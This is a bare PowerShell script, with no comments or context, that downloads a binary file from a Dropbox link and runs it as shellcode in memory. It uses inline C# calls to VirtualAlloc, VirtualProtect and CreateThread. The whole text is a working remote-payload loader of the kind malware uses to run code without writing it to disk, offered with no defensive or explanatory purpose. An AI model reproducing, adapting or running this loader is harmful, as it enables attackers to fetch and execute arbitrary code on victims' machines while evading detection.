$b = (iwr 'https://www.dropbox.com/scl/fi/461dh0eplmusl2jnmsnqm/pika.bin?rlkey=hgamqkpg7m8prs9xoj1mkbqcd&st=jqcx8kwx&dl=1' -UseB).Content;
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint n, out uint o);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
    public static void Run(byte[] b) {
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x04);
        Marshal.Copy(b, 0, addr, b.Length);
        uint old;
        VirtualProtect(addr, (uint)b.Length, 0x20, out old);
        IntPtr h = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(h, 0xFFFFFFFF);
    }
}
"@;
[P]::Run($b);